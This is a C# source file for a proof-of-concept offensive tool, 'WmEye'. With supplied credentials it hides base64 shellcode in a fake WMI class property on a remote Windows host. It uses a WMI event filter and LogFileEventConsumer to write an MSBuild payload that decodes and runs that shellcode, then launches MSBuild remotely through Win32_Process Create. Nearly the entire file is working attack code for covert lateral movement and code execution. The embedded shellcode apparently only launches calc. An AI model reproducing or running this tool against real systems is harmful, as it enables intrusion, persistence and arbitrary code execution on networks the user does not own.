/*
 * 
 * - Create a Remote WMI Class
 * - Write Shellcode as property value to the above created Class
 * - Create a WMI Event Filter to trigger on powershell.exe process creation
 * - On Event Trigger Upload MSBuild Payload into remote system using LogFileEventConsumer 
 * - Finally Invoke `Win32_Process Create` to call MSbuild remotely 
 * 
 *  The MSBuild Payload fetches encoded shellcode from WMI Class Property, decodes and executes it.
 * 
 *  [Author - 0xpwnisher]
 *  Note: Its just a POC, Not at all safe for real engagements!
 *
 */


using System;
using System.Collections;
using System.Collections.Generic;
using System.Management;
using System.Windows.Forms;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;



namespace WmEye
{
    public class WmEye
    {

        public static void Main(string[] args)
        {

            // Handle CLI Args 

            string hostname = args[0];
            string username = args[1];
            string password = args[2];

            Console.WriteLine("Username {0}", hostname);
            Console.WriteLine("Username {0}", username);
            Console.WriteLine("Username {0}", password);


            if (hostname == "localhost")
            {
                UploadShellcode(hostname, null, null);  // Uploads Shellcode into a remote class
                TriggerFileUpload(hostname, null, null); // Writes MSBuild Payload using WMI LogFileEventConsumer
                ExecutePayload(hostname, null, null);  // Remote executes MSBuild Payload

            }
            else { 
            UploadShellcode(hostname,  username, password);
            TriggerFileUpload(hostname, username, password);
            ExecutePayload(hostname, username, password);
            }

            // Add a Scope Cleanup Method

        }

        // Fake WMI Classe and Property to Store Shellcode 

        private static string ShellCodeUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
        private static string ShellCodeUploadTempWMIPropertyName = "Description";

        private static string writePath = "C:\\mtioc.xml";
        private static string msbuildpath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ";


        // Function to initiate different scopes based on namespaces and return
        private static string InitiateConnection(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
        {
            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            if (!String.IsNullOrEmpty(user) && !String.IsNullOrEmpty(password))
            {
                options.Username = user;
                options.Password = password;
            }


            if (String.IsNullOrEmpty(wmiNamespace))
            {
                wmiNamespace = "root\\cimv2";
            }

            string fullNamespace;
            if (!String.IsNullOrEmpty(host))
            {
                fullNamespace = String.Format(@"\\{0}\{1}", host, wmiNamespace);
            }
            else
            {
                fullNamespace = String.Format(@"\\.\{0}", wmiNamespace);
            }

            try
            {
                if(host == "localhost") {

                    scope = new ManagementScope(fullNamespace);
                    scope.Connect();
                }

                scope = new ManagementScope(fullNamespace, options);
                scope.Connect();
            }
            catch (UnauthorizedAccessException)
            {
                return String.Format("Username: {0} with Password {1} threw an unauthorised exception\n", user, password);
            }
            catch (Exception e)
            {
                return String.Format("[!] WMI connection failed: {0}", e.Message);
            }

            return "";
        }



        public static void Consumertwo(string data, string hostname, string username, string password)
        {

          //  Console.WriteLine(data);

            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;


            try
            {

                // want a replace filter which executes immediately
                // Trigger on next WMI Connection

                ConnectionOptions options = new ConnectionOptions();
               
                options.Username = username;
                options.Password = password;


                string wmiNameSpace = "root\\subscription";
                string fullscope =  String.Format(@"\\{0}\{1}", hostname, wmiNameSpace);
                ManagementScope scope = new ManagementScope(fullscope, options);
                scope.Connect();
                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                  "WHERE TargetInstance ISA \"Win32_Process\" " +
                    "AND TargetInstance.Name = \"powershell.exe\"";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "demoEventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("LogFileEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "LogFile";
                myEventConsumer["Filename"] = writePath;
                myEventConsumer["Text"] = data;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created");
                
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH

        }


        public static void TriggerFileUpload(string hostname, string username, string password)
        {

           string uploadFile = "C:\\magic.xml";
            
            if (!File.Exists(uploadFile))
            {
                Console.WriteLine("[-] Specified local file does not exist, not running PS runspace\n");

            }

          string content = File.ReadAllText(uploadFile);


          //  string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);

           // Console.WriteLine(content);

            if (hostname == "localhost")
            {
                Consumertwo(content, hostname, null, null);
            }
            else { 

            Consumertwo(content, hostname, username, password);
            }

            // A cleanup method to clear the event filter,
            // else the MSBUild XML file gets overwritten
            
            CleanFilter();


        }


       public static void CleanFilter()
        {

            Console.WriteLine("Remove the Event Filter after File is Written");
      
            // Check if File is written, if yes, remove the filter 
        
        }

        public static void UploadShellcode(string host, string username, string password)
        {


            string className = ShellCodeUploadTempWMIClassName;
            string evilPropertyName = ShellCodeUploadTempWMIPropertyName;

            // Calc ShellCode

            var scope = new ManagementScope();
            string fileData = @"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlIGMA";

            

            string r = InitiateConnection(ref scope, host,username,password, "");

            // We're creating a static WMI class here
            ManagementObject evilClass = new ManagementClass(scope, null, null);
            evilClass["__CLASS"] = className;
            evilClass.Properties.Add(evilPropertyName, CimType.String, false);
            evilClass.Properties[evilPropertyName].Value = fileData.ToString();

            try
            {
                Console.WriteLine("[X] Uploading Shellcode as Evil Property. : {0}", evilPropertyName);
                evilClass.Put();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception during setting the evil property : {0}", ex.Message);
                return;
            }


            Console.WriteLine("[X] ShellCode Property Created");
        }



        public static void ExecutePayload(string host, string username, string password)
        {


            var scope = new ManagementScope();
            string r = InitiateConnection(ref scope, host, username, password, "");

            // Invoke MSBuild using WIN32_Process Create Method for now
            // Replace later with VBScript or other WMI Class

            ObjectGetOptions optionons3 = new ObjectGetOptions();
            ManagementPath pather2 = new ManagementPath("Win32_Process");
            ManagementClass classInstance2 = new ManagementClass(scope, pather2, optionons3);
            ManagementBaseObject inParams2 = classInstance2.GetMethodParameters("Create");

            string Command = msbuildpath + writePath;

            inParams2["CommandLine"] = Command;
            
            Console.WriteLine("[X] Invoking : {0}", Command);

            ManagementBaseObject outParams2 = classInstance2.InvokeMethod("Create", inParams2, null);


        } 

    } 

}  

